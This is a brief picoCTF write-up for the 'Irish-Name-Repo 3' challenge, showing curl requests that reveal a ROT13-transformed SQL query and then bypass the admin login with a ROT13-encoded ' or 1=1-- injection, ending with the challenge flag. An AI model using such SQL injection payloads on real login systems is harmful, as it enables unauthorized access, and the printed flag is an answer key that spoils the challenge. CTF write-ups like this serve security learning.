# Retos picoCTF

# Level Irish-Name-Repo 3

## Objetivo
There is a secure website running at https://jupiter.challenges.picoctf.org/problem/40742/ (link) or http://jupiter.challenges.picoctf.org:40742. Try to see if you can login as admin!

## Solucion

```
┌──(kali㉿kali)-[~]
└─$ curl "https://jupiter.challenges.picoctf.org/problem/40742/login.php" --data "password=test&debug=1"

<pre>password: test
SQL query: SELECT * FROM admin where password = 'grfg'
</pre><h1>Login failed.</h1>                                                                            
┌──(kali㉿kali)-[~]
└─$ 
                                                                            
┌──(kali㉿kali)-[~]
└─$ curl "https://jupiter.challenges.picoctf.org/problem/40742/login.php" --data "password=' or 1=1--&debug=1"
<pre>password: ' or 1=1--
SQL query: SELECT * FROM admin where password = '' be 1=1--'
</pre>                                                                            
┌──(kali㉿kali)-[~]
└─$ curl "https://jupiter.challenges.picoctf.org/problem/40742/login.php" --data "password=' be 1=1--&debug=1" && echo
<pre>password: ' be 1=1--
SQL query: SELECT * FROM admin where password = '' or 1=1--'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}</p>

```

## Referencias


